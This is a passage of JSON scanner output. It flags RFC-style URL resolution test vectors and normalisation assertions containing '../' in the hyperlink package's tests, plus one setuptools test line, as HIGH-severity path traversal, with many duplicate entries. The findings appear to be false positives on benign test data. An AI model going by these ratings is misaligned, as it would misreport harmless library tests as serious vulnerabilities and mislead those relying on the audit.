            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/../g\", \"http://a/g\"),",
            "context": "    # not by themselves.\n    (\"/./g\", \"http://a/g\"),\n    (\"/../g\", \"http://a/g\"),\n    (\"g.\", \"http://a/b/c/g.\"),\n    (\".g\", \"http://a/b/c/.g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/../g\", \"http://a/g\"),",
            "context": "    # not by themselves.\n    (\"/./g\", \"http://a/g\"),\n    (\"/../g\", \"http://a/g\"),\n    (\"g.\", \"http://a/b/c/g.\"),\n    (\".g\", \"http://a/b/c/.g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 63,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"./../g\", \"http://a/b/g\"),",
            "context": "    (\"..g\", \"http://a/b/c/..g\"),\n    # Unnecessary or nonsensical forms of \".\" and \"..\".\n    (\"./../g\", \"http://a/b/g\"),\n    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 63,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"./../g\", \"http://a/b/g\"),",
            "context": "    (\"..g\", \"http://a/b/c/..g\"),\n    # Unnecessary or nonsensical forms of \".\" and \"..\".\n    (\"./../g\", \"http://a/b/g\"),\n    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g/../h\", \"http://a/b/c/h\"),",
            "context": "    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),\n    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g/../h\", \"http://a/b/c/h\"),",
            "context": "    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),\n    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "context": "    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),\n    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 68,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "context": "    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),\n    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n]\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n]\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n]\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 73,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n]\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 464,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "u = URL.from_text(\"http://hatnote.com/a/b/../c/./d/e/..\")",
            "context": "\n        # https://twistedmatrix.com/trac/ticket/8184\n        u = URL.from_text(\"http://hatnote.com/a/b/../c/./d/e/..\")\n        res = \"http://hatnote.com/a/c/d/\"\n        self.assertEqual(u.click(\"\").to_text(), res)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 464,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "u = URL.from_text(\"http://hatnote.com/a/b/../c/./d/e/..\")",
            "context": "\n        # https://twistedmatrix.com/trac/ticket/8184\n        u = URL.from_text(\"http://hatnote.com/a/b/../c/./d/e/..\")\n        res = \"http://hatnote.com/a/c/d/\"\n        self.assertEqual(u.click(\"\").to_text(), res)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 527,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"..\", \"http://localhost/a/\"],\n            [\"http://localhost/a/b/c\", \"./d/e\", \"http://localhost/a/b/d/e\"],\n            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 527,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"..\", \"http://localhost/a/\"],\n            [\"http://localhost/a/b/c\", \"./d/e\", \"http://localhost/a/b/d/e\"],\n            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 529,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\n                \"http://localhost/a/b/c/\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 529,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\n                \"http://localhost/a/b/c/\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 532,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../d/e/\",",
            "context": "            [\n                \"http://localhost/a/b/c/\",\n                \"../../d/e/\",\n                \"http://localhost/a/d/e/\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 532,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../d/e/\",",
            "context": "            [\n                \"http://localhost/a/b/c/\",\n                \"../../d/e/\",\n                \"http://localhost/a/d/e/\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 532,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../d/e/\",",
            "context": "            [\n                \"http://localhost/a/b/c/\",\n                \"../../d/e/\",\n                \"http://localhost/a/d/e/\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 532,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../d/e/\",",
            "context": "            [\n                \"http://localhost/a/b/c/\",\n                \"../../d/e/\",\n                \"http://localhost/a/d/e/\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 535,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "context": "                \"http://localhost/a/d/e/\",\n            ],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 535,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "context": "                \"http://localhost/a/d/e/\",\n            ],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 536,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            ],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\n                \"http://localhost/a/b/c/d\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 536,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            ],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\n                \"http://localhost/a/b/c/d\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 539,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"./e/../f/../g\",",
            "context": "            [\n                \"http://localhost/a/b/c/d\",\n                \"./e/../f/../g\",\n                \"http://localhost/a/b/c/g\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 539,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"./e/../f/../g\",",
            "context": "            [\n                \"http://localhost/a/b/c/d\",\n                \"./e/../f/../g\",\n                \"http://localhost/a/b/c/g\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 539,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"./e/../f/../g\",",
            "context": "            [\n                \"http://localhost/a/b/c/d\",\n                \"./e/../f/../g\",\n                \"http://localhost/a/b/c/g\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 539,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"./e/../f/../g\",",
            "context": "            [\n                \"http://localhost/a/b/c/d\",\n                \"./e/../f/../g\",\n                \"http://localhost/a/b/c/g\",\n            ],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 1409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "url = URL.from_text(\"HTTP://Example.com/A%61/./../A%61?B%62=C%63#D%64\")",
            "context": "    def test_normalize(self):\n        # type: () -> None\n        url = URL.from_text(\"HTTP://Example.com/A%61/./../A%61?B%62=C%63#D%64\")\n        assert url.get(\"Bb\") == []\n        assert url.get(\"B%62\") == [\"C%63\"]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
            "line": 1409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "url = URL.from_text(\"HTTP://Example.com/A%61/./../A%61?B%62=C%63#D%64\")",
            "context": "    def test_normalize(self):\n        # type: () -> None\n        url = URL.from_text(\"HTTP://Example.com/A%61/./../A%61?B%62=C%63#D%64\")\n        assert url.get(\"Bb\") == []\n        assert url.get(\"B%62\") == [\"C%63\"]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_decoded_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert durl.child(\"../test2%\").path[-1] == \"../test2%\"",
            "context": "        durl = DecodedURL.from_text(TOTAL_URL)\n        assert durl.sibling(\"te%t\").path[-1] == \"te%t\"\n        assert durl.child(\"../test2%\").path[-1] == \"../test2%\"\n        assert durl.child() == durl\n        assert durl.child() is durl",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_decoded_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert durl.child(\"../test2%\").path[-1] == \"../test2%\"",
            "context": "        durl = DecodedURL.from_text(TOTAL_URL)\n        assert durl.sibling(\"te%t\").path[-1] == \"te%t\"\n        assert durl.child(\"../test2%\").path[-1] == \"../test2%\"\n        assert durl.child() == durl\n        assert durl.child() is durl",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_decoded_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert durl.child(\"../test2%\").path[-1] == \"../test2%\"",
            "context": "        durl = DecodedURL.from_text(TOTAL_URL)\n        assert durl.sibling(\"te%t\").path[-1] == \"te%t\"\n        assert durl.child(\"../test2%\").path[-1] == \"../test2%\"\n        assert durl.child() == durl\n        assert durl.child() is durl",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/test/test_decoded_url.py",
            "line": 47,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "assert durl.child(\"../test2%\").path[-1] == \"../test2%\"",
            "context": "        durl = DecodedURL.from_text(TOTAL_URL)\n        assert durl.sibling(\"te%t\").path[-1] == \"te%t\"\n        assert durl.child(\"../test2%\").path[-1] == \"../test2%\"\n        assert durl.child() == durl\n        assert durl.child() is durl",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_egg_info.py",
            "line": 1243,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(egg_info_instance.egg_info + \"/SOURCES.txt\", encoding=\"utf-8\") as f:",
